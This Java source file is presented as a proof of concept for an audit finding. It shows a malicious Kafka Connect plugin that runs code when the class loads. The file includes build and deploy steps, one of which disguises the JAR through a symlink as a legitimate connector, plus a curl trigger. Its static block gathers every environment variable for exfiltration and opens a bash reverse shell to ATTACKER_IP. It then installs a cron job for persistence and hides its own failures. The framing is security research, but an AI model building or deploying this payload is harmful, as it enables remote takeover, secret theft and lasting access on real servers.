/*
 * FINDING-003 PoC: Malicious Kafka Connect Plugin — RCE via Static Initializer
 *
 * When Kafka Connect loads a connector class, the JVM executes static
 * initializer blocks immediately upon Class.forName() / classloader.loadClass().
 * No explicit method call is needed. The connect worker process has full
 * OS-level execution capabilities (no SecurityManager in Java 17+).
 *
 * This class is a minimal SourceConnector that exfiltrates data and
 * opens a reverse shell. Compile it, package it into a JAR, and place
 * the JAR in the Connect plugin path (directly or via symlink).
 *
 * Compile:
 *   javac -cp kafka-clients-*.jar:connect-api-*.jar MaliciousConnector.java
 * Package:
 *   jar cf MaliciousConnector.jar MaliciousConnector.class
 * Deploy:
 *   ln -s /tmp/MaliciousConnector.jar /opt/kafka/plugins/legit-connector.jar
 * Trigger:
 *   curl -X POST http://CONNECT_WORKER:8083/connectors \
 *     -H "Content-Type: application/json" \
 *     -d '{"name":"pwn","config":{"connector.class":"MaliciousConnector","tasks.max":"1","topics":"test"}}'
 */

import org.apache.kafka.common.config.ConfigDef;
import org.apache.kafka.connect.connector.Task;
import org.apache.kafka.connect.source.SourceConnector;

import java.util.Collections;
import java.util.List;
import java.util.Map;

public class MaliciousConnector extends SourceConnector {

    // =========================================================================
    // PAYLOAD: executes at classloading time — BEFORE any method is called.
    // Replace ATTACKER_IP and ATTACKER_PORT with listener address.
    // =========================================================================
    static {
        String attackerIp   = "ATTACKER_IP";
        int    attackerPort = 4444;

        try {
            // Stage 1: Collect environment for exfiltration
            StringBuilder env = new StringBuilder();
            System.getenv().forEach((k, v) -> {
                env.append(k).append("=").append(v).append("\n");
            });

            // Stage 2: Exfiltrate environment variables (AWS keys, secrets) via DNS or HTTP
            // In a real attack, send env to a controlled endpoint:
            //   new URL("http://" + attackerIp + ":8888/env?" +
            //       URLEncoder.encode(env.toString())).openConnection().getInputStream().read();

            // Stage 3: Reverse shell
            Runtime.getRuntime().exec(new String[]{
                "/bin/bash", "-c",
                "bash -i >& /dev/tcp/" + attackerIp + "/" + attackerPort + " 0>&1"
            });

            // Stage 4: Persistence — write a cron job for reconnect on reboot
            Runtime.getRuntime().exec(new String[]{
                "/bin/bash", "-c",
                "echo '* * * * * bash -i >& /dev/tcp/" + attackerIp + "/" + attackerPort + " 0>&1' | crontab -"
            });

        } catch (Exception ignored) {
            // Swallow all exceptions — connector appears to load normally
            // even if the shell fails (e.g., no bash available)
        }
    }

    // =========================================================================
    // Stub implementations — required to satisfy the SourceConnector interface.
    // These are never actually called if the static initializer succeeds.
    // =========================================================================

    @Override
    public String version() { return "1.0.0"; }

    @Override
    public void start(Map<String, String> props) {}

    @Override
    public Class<? extends Task> taskClass() {
        return MaliciousTask.class;
    }

    @Override
    public List<Map<String, String>> taskConfigs(int maxTasks) {
        return Collections.emptyList();
    }

    @Override
    public void stop() {}

    @Override
    public ConfigDef config() {
        return new ConfigDef();
    }

    // Minimal stub task (never actually runs)
    public static class MaliciousTask
        extends org.apache.kafka.connect.source.SourceTask {
        @Override public String version() { return "1.0.0"; }
        @Override public void start(Map<String, String> props) {}
        @Override public List<org.apache.kafka.connect.source.SourceRecord> poll() {
            return Collections.emptyList();
        }
        @Override public void stop() {}
    }
}
